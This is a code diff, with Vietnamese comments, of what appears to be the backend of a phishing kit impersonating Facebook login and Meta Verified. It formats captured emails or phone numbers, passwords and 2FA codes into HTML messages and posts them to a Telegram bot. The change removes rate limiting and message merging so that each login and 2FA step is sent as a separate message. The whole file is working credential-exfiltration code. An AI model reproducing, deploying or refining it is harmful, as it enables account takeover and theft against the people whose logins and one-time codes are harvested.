@@ -1,7 +1,5 @@
 import https from 'https';
 import axios from 'axios';
-import { memoryStoreTTL } from '@/utils/memoryStore';
-import { generateKey } from '@/utils/generateKey';
 
 const agent = new https.Agent({ family: 4 });
 
@@ -15,22 +13,6 @@ function getTelegramConfig() {
         api: `https://api.telegram.org/bot${token}`,
         chatId,
     };
-}
-
-// Simple rate limiter to prevent spam
-const rateLimiter = new Map<string, number>();
-const RATE_LIMIT_WINDOW = 1000;
-
-function checkRateLimit(key: string): boolean {
-    const now = Date.now();
-    const lastCall = rateLimiter.get(key);
-
-    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
-        rateLimiter.set(key, now);
-        return true;
-    }
-
-    return false;
 }
 
 // Retry utility for Telegram API calls
@@ -71,41 +53,12 @@ async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 
     throw lastError;
 }
 
-/** New Telegram flow: merge payload in-memory, then `editMessageText` same `message_id` when possible (one thread message per session key). */
-async function sendOrEditMessage(
+/** Mỗi lần gọi = một tin `sendMessage` mới (Log in / 2FA — không ghép không sửa tin cũ). */
+async function sendNewTelegramMessage(
     apiRoot: string,
     chatId: string,
     text: string,
-    existingMessageId?: number
 ): Promise<number | undefined> {
-    if (existingMessageId != null) {
-        try {
-            const res = await retryTelegramRequest(() =>
-                axios.post(
-                    `${apiRoot}/editMessageText`,
-                    {
-                        chat_id: chatId,
-                        message_id: existingMessageId,
-                        text,
-                        parse_mode: 'HTML',
-                    },
-                    {
-                        httpsAgent: agent,
-                        timeout: 10000,
-                    },
-                ),
-            );
-            const id = res?.data?.result?.message_id;
-            return id ?? existingMessageId;
-        } catch (err: unknown) {
-            const anyErr = err as { response?: { data?: { description?: string } }; message?: string };
-            console.warn(
-                '⚠️ editMessageText failed, sending new message:',
-                anyErr?.response?.data?.description || anyErr?.message || err,
-            );
-        }
-    }
-
     const res = await retryTelegramRequest(() =>
         axios.post(
             `${apiRoot}/sendMessage`,
@@ -166,18 +119,6 @@ function normalizeData(input: any = {}) {
     };
 }
 
-function mergeData(oldData: any = {}, newData: any = {}) {
-    const normalizedOld = normalizeData(oldData);
-    const normalizedNew = normalizeData(newData);
-    const result: any = { ...normalizedOld };
-    Object.entries(normalizedNew).forEach(([k, v]) => {
-        if (v !== undefined && v !== '') {
-            result[k] = v;
-        }
-    });
-    return result;
-}
-
 type NormalizedPayload = ReturnType<typeof normalizeData>;
 
 /** Email ô đăng nhập; fallback số điện thoại (luồng Meta Verified thường để phone riêng). */
@@ -196,22 +137,20 @@ function primaryPasswordField(d: NormalizedPayload): string {
 }
 
 function appendTwoFaBlock(lines: string[], d: NormalizedPayload) {
-    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
-    if (!has2FA) return;
+    const steps: { label: string; val: string }[] = [];
+    if (String(d.twoFa ?? '').trim()) steps.push({ label: '🔐 2FA step 1', val: String(d.twoFa).trim() });
+    if (String(d.twoFaSecond ?? '').trim()) steps.push({ label: '🔐 2FA step 2', val: String(d.twoFaSecond).trim() });
+    if (String(d.twoFaThird ?? '').trim())
+        steps.push({ label: '🔐 (legacy)', val: String(d.twoFaThird).trim() });
+    if (steps.length === 0) return;
 
-    lines.push(
-        `----------------------`,
-        `<b>🔐 2FA step 1</b>`,
-        `<code>${formatCodeField(d.twoFa)}</code>`,
-        `<b>🔐 2FA step 2</b>`,
-        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
-    );
-    if (d.twoFaThird) {
-        lines.push(`<i>(legacy)</i> <code>${formatCodeField(d.twoFaThird)}</code>`);
+    lines.push(`----------------------`);
+    for (const { label, val } of steps) {
+        lines.push(`<b>${label}</b>`, `<code>${formatCodeField(val)}</code>`);
     }
 }
 
-/** Một định dạng tin duy nhất cho mọi luồng; chỉ khác dòng tiêu đề. */
+/** Một định dạng cho **một snapshot** POST (đúng dữ liệu lần gọi đó). */
 function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
     const headline =
         d.submissionFlow === 'facebook_login' ? `<b>🔷 FACEBOOK LOGIN</b>` : `<b>📋 META VERIFIED</b>`;
@@ -239,20 +178,12 @@ export async function sendTelegramMessage(data: any): Promise<void> {
         return;
     }
 
-    const key = generateKey(data);
-    if (!checkRateLimit(key)) {
-        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
-        return;
-    }
-    const prev = memoryStoreTTL.get(key);
-    const fullData = mergeData(prev?.data, data);
-    const updatedText = formatMessage(fullData);
+    const text = formatMessage(data);
 
     try {
-        const messageId = await sendOrEditMessage(config.api, config.chatId, updatedText, prev?.messageId);
+        const messageId = await sendNewTelegramMessage(config.api, config.chatId, text);
         if (messageId !== undefined) {
-            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-            console.log(`✅ Telegram ${prev?.messageId ? 'updated message' : 'new message'}. ID: ${messageId}`);
+            console.log(`✅ Telegram new message ID: ${messageId}`);
         } else {
             console.warn('⚠️ Telegram response không có message_id');
         }
